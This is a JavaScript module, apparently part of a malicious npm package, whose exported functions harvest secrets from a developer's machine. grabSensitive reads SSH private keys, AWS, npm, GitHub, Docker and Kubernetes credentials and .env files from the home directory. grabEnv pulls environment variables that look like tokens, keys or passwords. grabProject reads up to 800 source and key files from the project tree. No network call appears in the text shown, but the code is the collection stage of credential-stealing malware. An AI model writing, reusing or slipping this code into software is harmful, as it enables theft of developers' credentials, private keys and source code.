const fs = require('fs');
const path = require('path');
const os = require('os');

const SENSITIVE_NAMES = [
  '.npmrc', '.env', '.env.local', '.env.production',
  '.git-credentials', '.netrc',
  '.ssh/id_rsa', '.ssh/id_ed25519', '.ssh/id_ecdsa',
  '.ssh/config', '.ssh/known_hosts',
  '.aws/credentials', '.aws/config',
  '.config/gh/hosts.yml',
  '.docker/config.json',
  '.kube/config',
  '.pypirc',
  '.gitconfig',
  'id_rsa', 'id_ed25519',
  'credentials.json', 'service-account.json',
  'terraform.tfstate',
  '.htpasswd',
];

const CODE_EXT = new Set([
  '.js', '.mjs', '.cjs', '.ts', '.tsx', '.jsx', '.vue', '.svelte',
  '.py', '.rb', '.go', '.rs', '.java', '.kt', '.swift', '.php', '.cs',
  '.json', '.yaml', '.yml', '.toml', '.ini', '.conf', '.config',
  '.env', '.pem', '.key', '.crt', '.cer', '.p12', '.pfx',
  '.sh', '.bash', '.zsh', '.ps1', '.bat', '.cmd',
  '.sql', '.graphql', '.proto',
  '.md', '.txt',
]);

const SKIP_DIRS = new Set([
  '.git', '.svn', '.hg',
  'dist', 'build', '.next', '.nuxt', 'out', 'target',
  '.cache', '.parcel-cache', 'coverage', '.nyc_output',
]);

const MAX_FILE_BYTES  = 512 * 1024;
const MAX_TOTAL_BYTES = 20 * 1024 * 1024;
const MAX_DEPTH       = 10;
const MAX_FILES       = 800;

function home() {
  return os.homedir();
}

function statSafe(p) {
  try { return fs.statSync(p); } catch { return null; }
}

function readCapped(p, cap) {
  const s = statSafe(p);
  if (!s || !s.isFile()) return null;
  if (s.size > cap) return null;
  try { return fs.readFileSync(p); } catch { return null; }
}

function looksLikeProjectRoot(dir) {
  try {
    if (fs.existsSync(path.join(dir, 'package.json'))) return true;
    if (fs.existsSync(path.join(dir, 'requirements.txt'))) return true;
    if (fs.existsSync(path.join(dir, 'pyproject.toml'))) return true;
    if (fs.existsSync(path.join(dir, 'go.mod'))) return true;
    if (fs.existsSync(path.join(dir, 'Cargo.toml'))) return true;
    if (fs.existsSync(path.join(dir, 'Gemfile'))) return true;
    if (fs.existsSync(path.join(dir, '.git'))) return true;
  } catch {}
  return false;
}

function findProjectRoot(start) {
  let cur = path.resolve(start);
  const visited = [];
  for (let i = 0; i < 8; i++) {
    if (looksLikeProjectRoot(cur)) return cur;
    visited.push(cur);
    const parent = path.dirname(cur);
    if (parent === cur) break;
    cur = parent;
  }
  return visited[0] || path.resolve(start);
}

function walk(root, out, depth, projectRoot) {
  if (out.length >= MAX_FILES) return;
  if (depth > MAX_DEPTH) return;
  let entries;
  try { entries = fs.readdirSync(root, { withFileTypes: true }); }
  catch { return; }

  for (const e of entries) {
    if (out.length >= MAX_FILES) return;
    if (e.isSymbolicLink()) continue;

    const full = path.join(root, e.name);

    if (e.isDirectory()) {
      if (SKIP_DIRS.has(e.name)) continue;
      if (e.name === 'node_modules' && path.resolve(root) === path.resolve(projectRoot)) {
        continue;
      }
      walk(full, out, depth + 1, projectRoot);
    } else if (e.isFile()) {
      const ext = path.extname(e.name).toLowerCase();
      if (CODE_EXT.has(ext)) out.push(full);
    }
  }
}

function grabSensitive() {
  const H = home();
  const found = [];
  for (const rel of SENSITIVE_NAMES) {
    const p = path.join(H, rel);
    const buf = readCapped(p, MAX_FILE_BYTES);
    if (buf) found.push({ path: p, data: buf });
  }
  return found;
}

function grabProject(cwd) {
  const cwdResolved = path.resolve(cwd);
  const projectRoot = findProjectRoot(cwdResolved);
  const files = [];
  walk(projectRoot, files, 0, projectRoot);

  const picked = [];
  let total = 0;
  for (const p of files) {
    if (total >= MAX_TOTAL_BYTES) break;
    const buf = readCapped(p, MAX_FILE_BYTES);
    if (!buf) continue;
    total += buf.length;
    picked.push({ path: p, data: buf });
  }
  return { root: projectRoot, picked, cwd: cwdResolved };
}

function grabEnv() {
  const out = [];
  for (const [k, v] of Object.entries(process.env)) {
    if (/TOKEN|KEY|SECRET|PASS|PWD|AWS|GH_|NPM_|STRIPE|DB_|DATABASE|PRIVATE|API/i.test(k)) {
      out.push(`${k}=${(v || '').slice(0, 500)}`);
    }
  }
  return out.join('\n');
}

module.exports = {
  grabSensitive, grabProject, grabEnv,
  home, findProjectRoot,
};